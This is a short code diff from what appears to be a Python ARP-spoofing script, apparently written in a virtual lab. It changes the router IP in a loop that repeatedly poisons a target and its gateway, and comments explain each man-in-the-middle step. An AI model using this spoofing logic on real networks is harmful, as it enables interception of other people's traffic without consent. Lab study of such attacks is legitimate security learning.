@@ -28,9 +28,9 @@ def spoof(target_ip, spoof_ip):
 while True:
     # ip - target, ip2 - router
     # I am telling the target I am the router
-    spoof("192.168.56.112", '192.168.56.0') 
+    spoof("192.168.56.112", '10.0.2.2') 
     # I am telling the router I am the client
-    spoof("192.168.56.0", "192.168.56.112")
+    spoof("10.0.2.2", "192.168.56.112")
     time.sleep(2)
     # I am telling the router to send back to that IP so that don't know I am in the middle
     # get_mac('10.0.2.2')
